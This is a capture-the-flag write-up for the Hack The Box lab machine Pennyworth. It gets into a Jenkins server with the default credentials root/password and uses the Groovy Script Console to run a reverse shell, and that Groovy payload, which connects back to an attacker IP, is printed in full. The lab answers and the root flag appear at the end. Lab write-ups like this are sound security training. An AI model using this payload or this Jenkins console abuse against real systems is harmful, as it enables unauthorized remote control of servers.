---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pennyworth (Tier 1)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark>**&#x20;1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Common Applications / Jenkins / Java / Reconnaissance / Remote Code Execution\
  &#x20;             / Default Credentials

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* With a little research, I started answering the first questions

<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Common Vulnerabilities and Exposures**_

***

<figure><img src="../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Confidentiality, Integrity, Availability**_

***

* Then I did an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.197.177 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

***

* I also did an exhaustive scan to get more information about the service running on the open port

<pre class="language-basic" data-line-numbers><code class="lang-basic"><strong>nmap 10.129.197.177 -p8080 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Jetty 9.4.39.v20210325**_

***

* I found the service was using the HTTP protocol on port 8080, so I visited the content being deployed through the browser. There I found a _Jenkins_ login page, and with a little [research](https://www.jenkins.io/), I learned this is an automation server for web services

<figure><img src="../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
{% endhint %}

***

* I tried to log in with common credentials and after trying with the username _root_ and the password _password_, I got in successfully to an administration dashboard. I explored the site and noticed that by scrolling down to the bottom the version of the _Jenkins_ service was shown

<figure><img src="../../.gitbook/assets/image (560).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

> Answer: _**2.289.1**_

***

* I searched for possible CVEs for this version of _Jenkins_ but didn't find anything. So I explored the options of the dashboard and found that by scrolling down under the _Manage Jenkins_ tab, there was an option named _Script Console_, and with some [research](https://www.jenkins.io/doc/book/managing/script-console/), I learned that it let to interact internally with the server via a type of script called _Groovy_

<figure><img src="../../.gitbook/assets/image (563).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (564).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (565).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Groovy**_

***

* With this, I could search for more exploitation options under this service, being the objective to gain a shell from the target system. So, to find out possible payloads I looked for help on the _Reverse Shell Cheat Sheet_ from the [_PayloadsAllTheThings_](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) repository. After exploring and testing some payloads for _Groovy_, we found [one](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#groovy) that worked, and let me gain a shell as the _root_ user. After that, I sanitized the terminal to interact better with the system

{% code title="RevShell.Groovy" overflow="wrap" lineNumbers="true" %}
```groovy
String host="10.10.14.117";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();
po.flush();
Thread.sleep(50);
try {p.exitValue();
break;
}catch (Exception e){}};
p.destroy();
s.close();
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn about the sanitization process you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
{% endhint %}

***

* With this and a little research, I answer the next questions

<figure><img src="../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

> Answer: _**cmd.exe**_

***

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ifconfig**_

***

<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

> Answer: _**-u**_

***

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Reverse Shell**_

***

* Then, I went to the _/root_ folder to see its contents and found a _root.txt_ file, finally reading it to obtain the flag

<figure><img src="../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**9cdfb439c7876e703e307864c9167a15**_
